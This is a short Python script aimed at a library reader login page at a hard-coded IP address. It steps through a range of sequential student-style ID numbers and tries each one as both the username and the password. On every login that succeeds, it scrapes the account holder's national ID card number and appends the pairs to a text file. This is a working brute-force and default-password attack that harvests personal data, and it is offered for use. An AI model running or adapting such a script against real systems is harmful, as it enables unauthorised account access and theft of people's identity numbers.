import urllib.request
import urllib.parse
import http.cookiejar
import re

lib_login = 'http://202.198.5.136:8080/reader/redr_verify.php'

def get_info(number, passwd, myfile):
    cj = http.cookiejar.CookieJar()
    pro = urllib.request.HTTPCookieProcessor(cj)
    opener = urllib.request.build_opener(pro)

    postDict = {
        'number':str(number),
        'passwd':str(passwd),
        'select':'cert_no',
        'returnUrl':''
    }
    postData = urllib.parse.urlencode(postDict).encode()
    op = opener.open(lib_login, postData)
    data = op.read().decode()
    log_ok = False
    is_login = re.compile('<font color="blue">.*</font>')
    for x in is_login.findall(data):
        login_ok = re.compile('<[^>]+>')
        login_ok = login_ok.sub('', x)
        if login_ok != '':
            log_ok = True
        else:
            log_ok = False
    if log_ok:
        person_id = re.compile('身份证号： </span>\d*</TD>')
        for x in person_id.findall(data):
            usr_psw = re.compile('<[^>]+>')
            usr_psw = usr_psw.sub('', x)
            usr_psw += '\n'
            number = str(number)
            number += '  '
            myfile.write(number)
            myfile.write(usr_psw)
            myfile.flush()
            print(number + 'OK')
            print(usr_psw)
        
f = open('./WiftStorage/wifi2013.txt', 'a')
for i in range(2013002734, 2013003980):
    get_info(i, i, f)
f.close()


























